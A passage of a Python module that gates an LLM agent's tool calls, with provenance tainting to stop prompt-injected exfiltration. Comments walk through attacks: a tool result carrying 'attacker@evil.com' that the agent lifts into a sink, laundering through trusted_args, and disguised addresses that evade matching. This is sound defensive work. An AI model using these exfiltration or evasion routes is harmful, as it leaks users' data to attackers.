    should parse and render it as structured fields, not inject it into markup.
    ``action_id`` commits that exact encoding to the frozen registration,
    effective risk, and executable. Risk fields and their evidence are
    detached canonical strings: compare them by value, never by Enum identity.
    Compatibility properties retain the small ``Decision`` callback surface
    used by beta callers while making the approved action inspectable.
    """

    decision: Decision
    tool_name: str
    arguments_json: str
    risk: str
    risk_assessment: RiskAssessmentSnapshot
    declared_risk: str | None
    risk_conflict: bool
    registration_id: str
    executable_id: str
    ledger_version: int
    action_id: str

    @property
    def allow(self) -> bool:
        return self.decision.allow

    @property
    def reason(self) -> str:
        return self.decision.reason

    @property
    def needs_confirm(self) -> bool:
        return self.decision.needs_confirm


def _same_authority_value(proposed: Any, trusted: Any) -> bool:
    """Compare authority-bearing values without Python's cross-type coercion.

    Tool calls are normally JSON-shaped, but the public runtime API also
    permits application-owned Python values. Built-in containers are compared
    recursively with exact types; unsupported objects match only by identity.
    This prevents values such as ``True`` and ``1`` (or an object with a
    permissive ``__eq__``) from acquiring trusted provenance accidentally.
    """

    if type(proposed) is not type(trusted):
        return False
    if proposed is None:
        return True
    if type(proposed) in (str, bytes, bool, int):
        return proposed == trusted
    if type(proposed) is float:
        if not (math.isfinite(proposed) and math.isfinite(trusted)):
            return False
        if proposed != trusted:
            return False
        # Python equality collapses the observably distinct JSON numbers 0.0
        # and -0.0.  Preserve the sign bit at this authority boundary.
        return proposed != 0.0 or math.copysign(1.0, proposed) == math.copysign(
            1.0,
            trusted,
        )
    if type(proposed) in (list, tuple):
        return len(proposed) == len(trusted) and all(
            _same_authority_value(left, right)
            for left, right in zip(proposed, trusted)
        )
    if type(proposed) is dict:
        if not all(type(key) is str for key in proposed):
            return proposed is trusted
        # Keyword invocation and application code can observe insertion order;
        # dict-keys equality is set-like, so compare the ordered key sequence.
        if tuple(proposed) != tuple(trusted):
            return False
        return all(
            _same_authority_value(proposed[key], trusted[key])
            for key in proposed
        )
    return proposed is trusted


def _safe_reason_text(value: str) -> str:
    """Escape controls and bidi/non-ASCII text before it reaches a reason."""

    try:
        return json.dumps(value, ensure_ascii=True)[1:-1]
    except Exception:
        return "<unrenderable>"


def _has_lone_surrogate(value: str) -> bool:
    """True when text contains a UTF-16 surrogate rather than a Unicode scalar."""

    return any(0xD800 <= ord(character) <= 0xDFFF for character in value)


MAX_JSON_DEPTH = 64
"""Maximum list/dict containers on one root-to-leaf JSON path."""

MAX_JSON_INTEGER_DIGITS = 512
"""Maximum decimal digits accepted for an integer at a runtime boundary."""

MAX_JSON_NODES = 100_000
"""Maximum values plus object keys retained in one JSON snapshot."""

MAX_JSON_MATERIAL_BYTES = 8 * 1024 * 1024
"""Maximum conservative serialized material charged to one JSON snapshot."""

_MAX_JSON_INTEGER_ABS = 10 ** MAX_JSON_INTEGER_DIGITS


class _JSONSnapshotBudgetExceeded(ValueError):
    """Internal signal that a plain-JSON snapshot exceeded a resource bound."""


class _JSONSnapshotBudget:
    """Incremental node/material budget shared by one logical snapshot."""

    __slots__ = ("remaining_nodes", "remaining_material_bytes")

    def __init__(self) -> None:
        if (
            type(MAX_JSON_NODES) is not int
            or MAX_JSON_NODES < 1
            or type(MAX_JSON_MATERIAL_BYTES) is not int
            or MAX_JSON_MATERIAL_BYTES < 0
        ):
            raise _JSONSnapshotBudgetExceeded(
                "plain-JSON snapshot limits are invalid"
            )
        self.remaining_nodes = MAX_JSON_NODES
        self.remaining_material_bytes = MAX_JSON_MATERIAL_BYTES

    def consume_material(self, amount: int) -> None:
        self.remaining_material_bytes -= amount
        if self.remaining_material_bytes < 0:
            raise _JSONSnapshotBudgetExceeded(
                "plain-JSON snapshot exceeds the serialized-material limit"
            )

    def consume_node(self) -> None:
        self.remaining_nodes -= 1
        if self.remaining_nodes < 0:
            raise _JSONSnapshotBudgetExceeded(
                "plain-JSON snapshot exceeds the total node limit"
            )
        # One byte conservatively covers an adjacent comma/colon or a scalar's
        # structural position. Containers add their second bracket below.
        self.consume_material(1)

    def consume_text(self, value: str) -> None:
        """Charge conservative ASCII-escaped JSON bytes incrementally.

        The walk stops as soon as the remaining budget is exceeded. This keeps
        an oversized single string from allocating another full-size byte
        buffer merely to discover that it cannot cross the boundary.
        """

        # Opening and closing JSON quotes. Non-ASCII code points are charged as
        # the ``ensure_ascii=True`` form used by runtime commitments: six bytes
        # for one BMP escape or twelve for a surrogate pair.
        self.consume_material(2)
        for character in value:
            codepoint = ord(character)
            if 0xD800 <= codepoint <= 0xDFFF:
                raise ValueError("lone surrogates are not valid tool-call text")
            if codepoint <= 0x1F or codepoint == 0x7F:
                self.consume_material(6)
            elif codepoint in (0x22, 0x5C):
                self.consume_material(2)
            elif codepoint <= 0x7F:
                self.consume_material(1)
            elif codepoint <= 0xFFFF:
                self.consume_material(6)
            else:
                self.consume_material(12)


def _snapshot_json_value(
    value: Any,
    seen: set[int] | None = None,
    *,
    _depth: int = 0,
    _budget: _JSONSnapshotBudget | None = None,
) -> Any:
    """Copy one provider-shaped value without invoking application methods.

    Lone UTF-16 surrogates are rejected at the boundary. They are not Unicode
    scalar values and otherwise produce encoder/UI-dependent behavior. JSON
    is also bounded to :data:`MAX_JSON_DEPTH` containers per path,
    :data:`MAX_JSON_INTEGER_DIGITS` decimal integer digits,
    :data:`MAX_JSON_NODES` total values/object keys, and
    :data:`MAX_JSON_MATERIAL_BYTES` conservative serialized material so later
    recursive checks and canonical serialization cannot escape as runtime
    exceptions.
    """

    budget = _JSONSnapshotBudget() if _budget is None else _budget
    budget.consume_node()
    if type(value) is str:
        budget.consume_text(value)
        return value
    if value is None:
        budget.consume_material(4)
        return value
    if type(value) is bool:
        budget.consume_material(4 if value else 5)
        return value
    if type(value) is int:
        if not (-_MAX_JSON_INTEGER_ABS < value < _MAX_JSON_INTEGER_ABS):
            raise ValueError("tool-call integers exceed the portable JSON limit")
        budget.consume_material(len(str(value)))
        return value
    if type(value) is float:
        if not math.isfinite(value):
            raise ValueError("non-finite numbers are not valid tool-call JSON")
        # CPython's finite binary-float rendering is much shorter; 32 bytes is
        # a portable conservative charge that avoids formatting just to count.
        budget.consume_material(32)
        return value
    if type(value) not in (list, dict):
        raise TypeError("tool calls must contain only JSON-compatible values")
    if _depth >= MAX_JSON_DEPTH:
        raise ValueError("tool-call JSON exceeds the maximum nesting depth")
    budget.consume_material(1)  # the second list/object bracket

    # Plain JSON is a tree, not an object graph.  Keep every container identity
    # for the whole walk (rather than only the active recursion path) so a
    # compact Python DAG cannot be expanded exponentially while it is copied.
    # Equal subtrees decoded from wire JSON remain valid because they are
    # distinct list/dict instances.
    seen = set() if seen is None else seen
    identity = id(value)
    if identity in seen:
        raise ValueError("cyclic or aliased tool-call values are not supported")
    seen.add(identity)
    if type(value) is list:
        return [
            _snapshot_json_value(
                item,
                seen,
                _depth=_depth + 1,
                _budget=budget,
            )
            for item in value
        ]
    copied: dict[str, Any] = {}
    for key, item in value.items():
        if type(key) is not str:
            raise TypeError("tool-call object keys must be strings")
        budget.consume_node()
        budget.consume_text(key)
        copied[key] = _snapshot_json_value(
            item,
            seen,
            _depth=_depth + 1,
            _budget=budget,
        )
    return copied


def _snapshot_tool_call(
    tool_use: Any,
    trusted_args: Any,
) -> tuple[dict[str, Any], dict[str, Any] | None]:
    """Create the exact immutable-by-isolation inputs the runner will gate."""

    if type(tool_use) is not dict:
        raise TypeError("tool call must be a dictionary")
    name = tool_use.get("name")
    if type(name) is not str or not name:
        raise ValueError("tool call must include a non-empty string name")
    tool_input = tool_use.get("input")
    if type(tool_input) is not dict:
        raise TypeError("tool call input must be a dictionary")
    if trusted_args is not None and type(trusted_args) is not dict:
        raise TypeError("trusted_args must be a dictionary")
    budget = _JSONSnapshotBudget()
    budget.consume_node()
    budget.consume_text(name)
    return (
        {
            "name": name,
            "input": _snapshot_json_value(tool_input, _budget=budget),
        },
        (
            None
            if trusted_args is None
            else _snapshot_json_value(trusted_args, _budget=budget)
        ),
    )


def _canonical_json_value(value: Any) -> str:
    return json.dumps(
        value,
        ensure_ascii=True,
        allow_nan=False,
        sort_keys=True,
        separators=(",", ":"),
    )


_PARAM_TYPES = frozenset(
    {
        "string",
        "number",
        "integer",
        "email",
        "uri",
        "enum",
        "boolean",
        "object",
        "array",
        "json",
    }
)


def _param_constraints_valid(p: Param) -> bool:
    """Fail closed when a declaration would silently ignore a constraint."""

    if type(p.type) is not str or p.type not in _PARAM_TYPES:
        return False
    if p.type == "enum":
        if p.enum is None or type(p.enum) not in (list, tuple):
            return False
    elif p.enum is not None:
        return False
    if p.max_len is not None:
        if type(p.max_len) is not int or p.max_len < 0:
            return False
        if p.type not in {"string", "email", "uri", "object", "array"}:
            return False
    if p.cap is not None:
        if not (
            type(p.cap) in (int, float)
            and (type(p.cap) is int or math.isfinite(p.cap))
        ):
            return False
        if p.type not in {"number", "integer"}:
            return False
    return True


def _type_ok(p: Param, v) -> bool:
    if not _param_constraints_valid(p):
        return False
    if p.type == "number":
        numeric = type(v) in (int, float)
        finite = type(v) is int or (type(v) is float and math.isfinite(v))
        return numeric and finite and (p.cap is None or v <= p.cap)
    if p.type == "integer":
        integer = type(v) is int or (
            type(v) is float and math.isfinite(v) and v.is_integer()
        )
        return integer and (p.cap is None or v <= p.cap)
    if p.type == "enum":
        try:
            if p.enum is None:
                return False
            canonical_candidate: str | None = None
            for member in p.enum:
                if isinstance(member, _FrozenEnumMember):
                    if canonical_candidate is None:
                        canonical_candidate = _canonical_json_value(v)
                    if canonical_candidate == member.canonical_json:
                        return True
                elif _same_authority_value(v, member):
                    return True
            return False
        except Exception:
            return False
    if p.type == "boolean":
        return type(v) is bool
    if p.type in ("string", "email", "uri"):
        return type(v) is str and (
            p.max_len is None or len(v) <= p.max_len
        )
    if p.type == "object":
        return type(v) is dict and (
            p.max_len is None or len(v) <= p.max_len
        )
    if p.type == "array":
        return type(v) is list and (
            p.max_len is None or len(v) <= p.max_len
        )
    if p.type == "json":
        try:
            _snapshot_json_value(v)
        except Exception:
            return False
        return True
    return False


# Homograph / mixed-script detection. Unicode script blocks are not contiguous:
# Cyrillic Supplement and the Extended blocks sit outside U+0400-U+04FF. The
# stdlib character names cover those additions without maintaining a partial
# range table. NFKC first exposes compatibility-width Latin characters.
def _unicode_script(character: str) -> str | None:
    name = unicodedata.name(character, "")
    for script in ("LATIN", "GREEK", "CYRILLIC"):
        if name.startswith(f"{script} "):
            return script
    return None


def _has_mixed_script(
    v: Any,
    _budget: _NFKCWorkBudget | None = None,
) -> bool:
    if type(v) is not str:
        return False
    if v.isascii():
        return False
    # Over-limit text is unsafe to normalize. For a value flowing into a
    # locked sink, treating it as suspicious is the fail-closed result.
    if len(v) > MAX_NFKC_INPUT_CHARS:
        return True
    scripts = {
        script
        for character in _bounded_nfkc(v, _budget)
        if (script := _unicode_script(character)) is not None
    }
    return len(scripts) > 1


def _contains_mixed_script(
    value: Any,
    seen: set[int] | None = None,
    _budget: _NFKCWorkBudget | None = None,
) -> bool:
    """Inspect built-in JSON containers for homographs without cycling."""

    if type(value) is str:
        return _has_mixed_script(value, _budget)
    if type(value) not in (dict, list, tuple):
        return False

    seen = set() if seen is None else seen
    identity = id(value)
    if identity in seen:
        return False
    seen.add(identity)
    try:
        if type(value) is dict:
            return any(
                (type(key) is str and _has_mixed_script(key, _budget))
                or _contains_mixed_script(item, seen, _budget)
                for key, item in value.items()
            )
        return any(
            _contains_mixed_script(item, seen, _budget) for item in value
        )
    finally:
        seen.remove(identity)


def gate(reg: Registry, ps: PolicySet, tool: str, args: dict, provenance: dict) -> Decision:
    if type(tool) is not str or not tool:
        return Decision(False, "tool name must be a non-empty string")
    if type(args) is not dict:
        return Decision(False, "tool arguments must be a plain dictionary")
    if type(provenance) is not dict:
        return Decision(False, "argument provenance must be a plain dictionary")
    try:
        argument_budget = _JSONSnapshotBudget()
        argument_budget.consume_node()
        argument_budget.consume_text(tool)
        args = _snapshot_json_value(args, _budget=argument_budget)
    except Exception:
        return Decision(
            False,
            "tool arguments must contain only finite, plain JSON values",
        )
    try:
        provenance = _snapshot_json_value(provenance)
    except Exception:
        return Decision(False, "argument provenance is malformed")
    if not all(
        type(name) is str
        and type(source) is str
        and source in ("data", "trusted")
        for name, source in provenance.items()
    ):
        return Decision(False, "argument provenance is malformed")
    try:
        if type(reg) is _FrozenRegistry and type(ps) is _FrozenPolicySet:
            runtime_registry = reg
            runtime_policy = ps
        else:
            if type(reg) is not Registry or type(ps) is not PolicySet:
                raise TypeError("runtime inputs must be exact registry and policy values")
            runtime_registry = _freeze_registry(reg, validate_callable=False)
            current_binding = _material_sha256(
                _registry_material(runtime_registry)
            )
            if (
                ps.registry_binding != current_binding
                or ps.registry_version != reg.version
            ):
                return Decision(False, "registry and policy registration diverged")
            runtime_policy = _freeze_policy_set(ps, runtime_registry)
    except Exception:
        return Decision(
            False,
            "registry or policy is malformed; rebuild the policy from the registry",
        )
    reg = runtime_registry
    ps = runtime_policy
    display_tool = _safe_reason_text(tool)
    if tool not in reg.tools:
        return Decision(False, f"verb '{display_tool}' is not in the registry")
    by_name = {p.name: p for p in reg.tools[tool].params}
    implementation = reg.tools[tool].fn
    if implementation is not None:
        try:
            _validate_callable_signature(tool, set(by_name), implementation)
        except Exception as exc:
            return Decision(
                False,
                "registered implementation is incompatible: "
                + _safe_reason_text(str(exc)),
            )
    pol = ps.policy[tool]
    for name, param in by_name.items():
        display_name = _safe_reason_text(name)
        if name not in args:
            if param.required:
                return Decision(False, f"required param '{display_name}' is missing")
            return Decision(
                False,
                f"param '{display_name}' has an implicit optional default; "
                "materialize and validate it before gating",
            )
    nfkc_budget = _NFKCWorkBudget()
    for name, val in args.items():
        display_name = _safe_reason_text(name)
        if name not in pol:
            return Decision(False, f"unknown param '{display_name}'")
        prov = provenance.get(name, "data")
        if pol[name] is Policy.TRUSTED_FIXED and prov == "data":
            return Decision(False, f"param '{display_name}' is a locked sink; data may not author it")
        # Only an otherwise trusted value needs structural homograph review;
        # untrusted data was already denied above. Share one work budget across
        # every nested value so repeated near-limit strings cannot amplify CPU.
        if pol[name] is Policy.TRUSTED_FIXED:
            try:
                mixed_script = _contains_mixed_script(
                    val,
                    _budget=nfkc_budget,
                )
            except _NFKCWorkLimitExceeded:
                return Decision(
                    False,
                    f"param '{display_name}' exceeds the Unicode normalization work limit",
                )
            if mixed_script:
                return Decision(False, f"param '{display_name}' mixes scripts (homograph); rejected as impersonation")
        # Provenance decides who may author the value; it never waives the
        # registered type, enum, length, or numeric cap.
        if not _type_ok(by_name[name], val):
            return Decision(False, f"param '{display_name}' failed its type/bounds check")
    if tool in ps.confirm:
        return Decision(True, f"risk policy ({ps.risk[tool].value}); needs human confirmation",
                        needs_confirm=True)
    return Decision(True, "within authority")


# === provenance ledger (partial taint propagation across a call chain) ====
#
# THE GAP THIS CLOSES (and the part it does not):
#
# The plain `dispatch` below decides provenance from a `trusted_args` map the
# developer supplies. That has a laundering hole: if a value came OUT of an
# earlier tool call (so it is really untrusted data the agent just read) and a
# naive developer threads it into `trusted_args` for the next call, the gate
# would trust it. That is Family 3 in adversarial.py.
#
# The ledger adds an INDEPENDENT, dev-proof source of truth. Every value a tool
# *returns* is data the agent read, so it is tainted at origin. We record those
# values. On a later call, if an argument's value matches something the ledger
# saw come out of a previous tool, the gate forces its provenance to "data" --
# EVEN IF the developer declared it trusted. The dev can no longer launder a
# tool result into a sink by mis-wiring trusted_args.
#
# What this is NOT: it is not CaMeL's sound interpreter taint. It tracks values
# by exact match, so a value the agent paraphrases or reformats (e.g. strips a
# name out of a sentence) no longer matches and escapes the ledger. It catches
# verbatim propagation -- the common, naive case -- not arbitrary control flow.
# Honest verdict: closes the laundering path it can SEE; the transform path
# still needs the dev to be careful (or a real interpreter).
def _json_leaf_token(value: Any) -> tuple[str, Any] | None:
    """Return a hashable token preserving the exact JSON scalar type."""

    if value is None:
        return ("null", None)
    if type(value) is str:
        return ("string", value)
    if type(value) is bool:
        return ("boolean", value)
    if type(value) is int:
        return ("integer", value)
    if type(value) is float and math.isfinite(value):
        return ("number", value)
    return None


MAX_LEDGER_ENTRIES = 10_000
"""Maximum retained exact/search index entries in one provenance session."""

MAX_LEDGER_UTF8_BYTES = 8 * 1024 * 1024
"""Maximum retained UTF-8 text material in one provenance session."""

MAX_LEDGER_LOOKUP_CHARACTERS = 16 * 1024 * 1024
"""Maximum containment-search work shared by one dispatch decision."""

MAX_CANONICAL_SKELETON_UNIQUE_CODEPOINTS = 4_096
"""Maximum distinct non-ASCII code points folded in one long result blob."""

MAX_CANONICAL_SKELETON_CHARS = MAX_NFKC_OPERATION_CHARS
"""Maximum compatibility-skeleton material built before failing closed."""


class _LedgerCapacityExceeded(ValueError):
    """Internal signal that a session ledger must be replaced, not retried."""


class _LedgerLookupBudgetExceeded(ValueError):
    """Internal signal that a containment query must conservatively taint."""


class _LedgerLookupBudget:
    """Deterministic character-work budget for ledger containment searches."""

    __slots__ = ("remaining", "exhausted", "normalization_budget")

    def __init__(self) -> None:
        if (
            type(MAX_LEDGER_LOOKUP_CHARACTERS) is not int
            or MAX_LEDGER_LOOKUP_CHARACTERS < 1
        ):
            self.remaining = 0
            self.exhausted = True
        else:
            self.remaining = MAX_LEDGER_LOOKUP_CHARACTERS
            self.exhausted = False
        self.normalization_budget = _NFKCWorkBudget()

    def consume(self, amount: int) -> None:
        # Charge before each substring operation. Once exhausted, this shared
        # object stays exhausted so later queries in the same dispatch also
        # fail closed without scanning history again.
        if (
            self.exhausted
            or type(amount) is not int
            or amount < 0
            or amount > self.remaining
        ):
            self.remaining = 0
            self.exhausted = True
            raise _LedgerLookupBudgetExceeded(
                "provenance ledger lookup work limit exceeded"
            )
        self.remaining -= amount


@dataclass
class ProvenanceLedger:
    """Remembers values that originated from tool results within one session.

    Thread one ledger through an agent's tool-use loop. Call `record_result`
    after each tool returns; pass the ledger to `dispatch` on each call.
    Ledger reads and writes are serialized. :class:`GuardedToolRunner` also
    holds this same re-entrant session lock from its final revalidation through
    invocation and result recording, so another thread cannot insert taint in
    the decision-to-execution gap.

    Two layers of matching:
      1. exact   -- a value equal to something a tool returned verbatim.
      2. contained -- a RISK-SHAPED value (an email or URL) that appears as a
         substring inside a larger free-text blob a tool returned. This closes
         the extraction-from-prose path: read_doc returns a sentence containing
         attacker@evil.com, the agent lifts the bare address out, and we still
         recognise it because it lived inside a tainted blob.

    Why containment is limited to risk-shaped values: checking "is this string
    a substring of anything a tool returned" for ALL arguments would flag
    innocuous values that happen to co-occur in returned text (a real first
    name, a common word), producing false positives. Restricting containment
    to emails/URLs -- the things that actually author exfiltration -- keeps the
    check cheap and the false-positive surface small.

    Still NOT closed (the honest next boundary): a value the agent *rewrites*
    semantically -- "attacker at evil dot com" as ordinary words, a base64
    blob, or a translated string -- is no longer the same lexical value. That
    needs real dataflow tracking through transforms (CaMeL's interpreter), not
    matching.

    Retention is fail-closed and bounded. Once either the entry or UTF-8 text
    budget is exhausted, the attempted write is not partially committed, the
    ledger becomes saturated, and every later call is denied. Start a new
    application session with a fresh ledger; never evict old taint in place.
    """
    _tainted: set[tuple[str, Any]] = field(
        default_factory=set, init=False, repr=False, compare=False
    )
    _tainted_containers: set[tuple[str, str]] = field(
        default_factory=set, init=False, repr=False, compare=False
    )
    _blobs: set[str] = field(
        default_factory=set, init=False, repr=False, compare=False
    )
    _canon_blobs: set[str] = field(
        default_factory=set, init=False, repr=False, compare=False
    )
    _normalization_incomplete: bool = field(
        default=False, init=False, repr=False, compare=False
    )
    _ascii_normalization_incomplete: bool = field(
        default=False, init=False, repr=False, compare=False
    )
    _utf8_bytes: int = field(default=0, init=False, repr=False, compare=False)
    _saturated: bool = field(default=False, init=False, repr=False, compare=False)
    _version: int = field(default=0, init=False, repr=False, compare=False)
    _lock: threading.RLock = field(
        default_factory=threading.RLock,
        init=False,
        repr=False,
        compare=False,
    )

    @property
    def version(self) -> int:
        with self._lock:
            return self._version

    @property
    def saturated(self) -> bool:
        """Whether capacity exhaustion has permanently closed this session."""

        with self._lock:
            return self._saturated

    def _mark_saturated(self) -> None:
        if not self._saturated:
            self._saturated = True
            self._version += 1
        raise _LedgerCapacityExceeded(
            "provenance ledger capacity exhausted; start a new session and "
            "do not retry the already-invoked tool"
        )

    def record_result(self, result: Any) -> None:
        """Atomically register typed leaves, containers, and object keys."""

        normalized_result = _snapshot_json_value(result)
        with self._lock:
            if self._saturated:
                self._mark_saturated()

            pending_tainted: set[tuple[str, Any]] = set()
            pending_containers: set[tuple[str, str]] = set()
            pending_blobs: set[str] = set()
            pending_canon_blobs: set[str] = set()
            pending_normalization_incomplete = False
            pending_ascii_normalization_incomplete = False
            pending_utf8_bytes = 0
            normalization_budget = _NFKCWorkBudget()
            risk_form_cache: dict[str, bool] = {}

            def reserve(text: str) -> None:
                nonlocal pending_utf8_bytes
                pending_utf8_bytes += len(text.encode("utf-8"))

            def capacity_exceeded() -> bool:
                pending_entries = (
                    len(pending_tainted)
                    + len(pending_containers)
                    + len(pending_blobs)
                    + len(pending_canon_blobs)
                )
                retained_entries = (
                    len(self._tainted)
                    + len(self._tainted_containers)
                    + len(self._blobs)
                    + len(self._canon_blobs)
                )
                return (
                    retained_entries + pending_entries > MAX_LEDGER_ENTRIES
                    or self._utf8_bytes + pending_utf8_bytes
                    > MAX_LEDGER_UTF8_BYTES
                )

            if capacity_exceeded():
                self._mark_saturated()

            for leaf, is_key in _iter_json_taint_values(normalized_result):
                normalization_too_expensive = (
                    type(leaf) is str
                    and len(leaf) > MAX_NFKC_INPUT_CHARS
                    and not leaf.isascii()
                )
                token = _json_leaf_token(leaf)
                if token is None:
                    continue
                if token not in self._tainted and token not in pending_tainted:
                    pending_tainted.add(token)
                    if type(leaf) is str:
                        reserve(leaf)
                if capacity_exceeded():
                    self._mark_saturated()
                if type(leaf) is str:
                    blob_already_indexed = (
                        leaf in self._blobs or leaf in pending_blobs
                    )
                    if not is_key or blob_already_indexed:
                        needs_search_index = True
                    else:
                        cached_risk_form = risk_form_cache.get(leaf)
                        if cached_risk_form is None:
                            try:
                                cached_risk_form = _has_risk_shaped_form(
                                    leaf,
                                    normalization_budget,
                                )
                            except _NFKCWorkLimitExceeded:
                                self._mark_saturated()
                            risk_form_cache[leaf] = cached_risk_form
                        needs_search_index = cached_risk_form
                    if not needs_search_index:
                        continue
                    if blob_already_indexed:
                        # Canonical material for this exact blob was already
                        # indexed (or deliberately marked incomplete). Do not
                        # repeat adversarial normalization for duplicate leaves
                        # within this result or in later record_result calls.
                        continue
                    if leaf not in self._blobs and leaf not in pending_blobs:
                        pending_blobs.add(leaf)
                        reserve(leaf)
                    if capacity_exceeded():
                        self._mark_saturated()
                    if normalization_too_expensive:
                        # Preserve exact and raw-containment taint without
                        # entering adversarial whole-string NFKC work. An
                        # ASCII compatibility skeleton retains useful email/
                        # URL containment while non-ASCII candidates remain
                        # conservatively incomplete.
                        pending_normalization_incomplete = True
                        try:
                            canonical = _canonical_ascii_skeleton(
                                leaf,
                                normalization_budget,
                                MAX_LEDGER_UTF8_BYTES
                                - self._utf8_bytes
                                - pending_utf8_bytes,
                            )
                        except _NFKCWorkLimitExceeded:
                            self._mark_saturated()
                        if canonical is None:
                            pending_ascii_normalization_incomplete = True
                        elif (
                            canonical not in self._canon_blobs
                            and canonical not in pending_canon_blobs
                        ):
                            pending_canon_blobs.add(canonical)
                            reserve(canonical)
                    else:
                        try:
                            canonical = _canonical(
                                leaf,
                                normalization_budget,
                            )
                        except _NFKCWorkLimitExceeded:
                            self._mark_saturated()
                        if (
                            canonical not in self._canon_blobs
                            and canonical not in pending_canon_blobs
                        ):
                            pending_canon_blobs.add(canonical)
                            reserve(canonical)
                if capacity_exceeded():
                    self._mark_saturated()

            for container in _iter_json_containers(normalized_result):
                token = _json_container_token(container)
                if (
                    token is not None
                    and token not in self._tainted_containers
                    and token not in pending_containers
                ):
                    pending_containers.add(token)
                    reserve(token[1])
                if capacity_exceeded():
                    self._mark_saturated()

            # Commit only after every candidate fits. Capacity failure above
            # leaves all taint/search stores unchanged and closes the session.
            self._tainted.update(pending_tainted)
            self._tainted_containers.update(pending_containers)
            self._blobs.update(pending_blobs)
            self._canon_blobs.update(pending_canon_blobs)
            self._normalization_incomplete = (
                self._normalization_incomplete
                or pending_normalization_incomplete
            )
            self._ascii_normalization_incomplete = (
                self._ascii_normalization_incomplete
                or pending_ascii_normalization_incomplete
            )
            self._utf8_bytes += pending_utf8_bytes
            self._version += 1

    def is_tainted(self, value: Any) -> bool:
        """True if value is a tool-result value (exact), a risk-shaped value
        extracted from a blob (contained), or a CANONICAL match -- the same
        risk-shaped value in disguise (homograph, uppercase, spaced).

        JSON-shaped containers are checked recursively. A cycle is treated as
        tainted so the direct dispatch API fails closed instead of recursing.
        """

        return self._is_tainted_with_budget(value, _LedgerLookupBudget())

    def _is_tainted_with_budget(
        self,
        value: Any,
        budget: _LedgerLookupBudget,
    ) -> bool:
        """Budget-aware implementation shared across one dispatch decision."""

        if type(budget) is not _LedgerLookupBudget:
            return True
        with self._lock:
            if self._saturated:
                return True
        try:
            normalized_value = _snapshot_json_value(value)
        except Exception:
            return True
        with self._lock:
            if self._saturated:
                return True
            try:
                return self._is_tainted_value(
                    normalized_value,
                    set(),
                    0,
                    budget,
                )
            except (_LedgerLookupBudgetExceeded, _NFKCWorkLimitExceeded):
                return True

    def _is_tainted_value(
        self,
        value: Any,
        seen: set[int],
        depth: int,
        budget: _LedgerLookupBudget,
    ) -> bool:
        token = _json_leaf_token(value)
        if token is not None:
            if token in self._tainted:
                return True
            if type(value) is str:
                return self._is_tainted_string(value, budget)
            return False
        if type(value) not in (dict, list, tuple):
            return False
        if depth >= MAX_JSON_DEPTH:
            return True
        container_token = _json_container_token(value)
        if (
            container_token is None
            or container_token in self._tainted_containers
        ):
            return True

        identity = id(value)
        if identity in seen:
            return True
        seen.add(identity)
        try:
            if type(value) is dict:
                return any(
                    (
                        type(key) is str
                        and (
                            ("string", key) in self._tainted
                            or (
                                _has_risk_shaped_form(
                                    key,
                                    budget.normalization_budget,
                                )
                                and self._is_tainted_string(key, budget)
                            )
                        )
                    )
                    or self._is_tainted_value(
                        item,
                        seen,
                        depth + 1,
                        budget,
                    )
                    for key, item in value.items()
                )
            return any(
                self._is_tainted_value(item, seen, depth + 1, budget)
                for item in value
            )
        finally:
            seen.remove(identity)

    def _is_tainted_string(
        self,
        value: str,
        budget: _LedgerLookupBudget,
    ) -> bool:
        # No lookup result may become a false negative merely because it is
        # too expensive to normalize. This check precedes hashing, stripping,
        # risk-shape matching, and canonicalization.
        if len(value) > MAX_NFKC_INPUT_CHARS and not value.isascii():
            return True
        if ("string", value) in self._tainted:            # layer 1: exact
            return True
        v = value.strip()
        if not v:
            return False
        if _is_risk_shaped(v):                          # layer 2: contained
            budget.consume(len(v))
            for blob in self._blobs:
                budget.consume(len(v) + len(blob))
                if v in blob:
                    return True
        # layer 3: canonical. Fold the value to a disguise-free form and look
        # for it in the canonicalized blobs. This catches the family the
        # adaptive attacker found -- homograph / uppercase / spaced variants
        # of a tainted address -- without a separate rule per trick.
        try:
            cv = _canonical(v, budget.normalization_budget)
        except _NFKCWorkLimitExceeded:
            return True
        if _is_risk_shaped(cv):
            budget.consume(len(cv))
            for canonical_blob in self._canon_blobs:
                budget.consume(len(cv) + len(canonical_blob))
                if cv in canonical_blob:
                    return True
            if (
                cv.isascii()
                and self._ascii_normalization_incomplete
            ) or (
                not cv.isascii()
                and self._normalization_incomplete
            ):
                # At least one retained Unicode blob was too large to
                # canonicalize safely. It could contain this destination in a
                # lexical disguise, so absence from the partial index is not
                # evidence of trusted independence.
                return True
        return False


_RLOCK_TYPE = type(threading.RLock())


def _ledger_internal_binding(ledger: ProvenanceLedger) -> tuple[int, ...]:
    """Validate and bind the exact mutable stores behind one session ledger."""

    if (
        type(ledger._tainted) is not set
        or type(ledger._tainted_containers) is not set
        or type(ledger._blobs) is not set
        or type(ledger._canon_blobs) is not set
        or type(ledger._normalization_incomplete) is not bool
        or type(ledger._ascii_normalization_incomplete) is not bool
        or type(ledger._lock) is not _RLOCK_TYPE
        or type(ledger._utf8_bytes) is not int
        or ledger._utf8_bytes < 0
        or type(ledger._saturated) is not bool
        or type(ledger._version) is not int
        or ledger._version < 0
    ):
        raise TypeError("ledger internals must be pristine built-in stores")
    return (
        id(ledger._tainted),
        id(ledger._tainted_containers),
        id(ledger._blobs),
        id(ledger._canon_blobs),
        id(ledger._lock),
    )


# Canonicalization: fold a value to a single disguise-free form so that
# variants meant to look different to a string comparison but identical to a
# human (or to the destination system) collapse together. This is the
# principled answer to the adaptive attacker: rather than a rule per trick
# (homograph, uppercase, spacing), normalize once and compare.
#   - NFKC unicode normalization folds many compatibility/confusable forms
#   - casefold() handles case variation
#   - stripping spaces and common obfuscation separators handles "a t t a c k"
#     and "attacker [at] evil [dot] com" style spacing
# HONEST BOUNDARY (unchanged): this folds *lexical* disguises. It does NOT
# undo a SEMANTIC rewrite the model must interpret -- "attacker at evil dot
# com" written as words the agent reads and reconstructs is no longer the same
# string in disguise, it is content the model understood. That still needs
# interpreter-level dataflow tracking (CaMeL/FIDES), not normalization.

_DISGUISE = re.compile(r"[\s\[\](){}<>]+")
_BRACKETED_AT = re.compile(r"[\[({<]\s*a\s*t\s*[\])}>]")
_BRACKETED_DOT = re.compile(r"[\[({<]\s*d\s*o\s*t\s*[\])}>]")


def _finish_canonical(value: str) -> str:
    value = value.casefold()
    value = _BRACKETED_AT.sub("@", value)
    value = _BRACKETED_DOT.sub(".", value)
    value = _DISGUISE.sub("", value)
    return value


def _canonical(
    s: str,
    _budget: _NFKCWorkBudget | None = None,
) -> str:
    if type(s) is not str:
        return ""
    if s.isascii():
        n = s
    else:
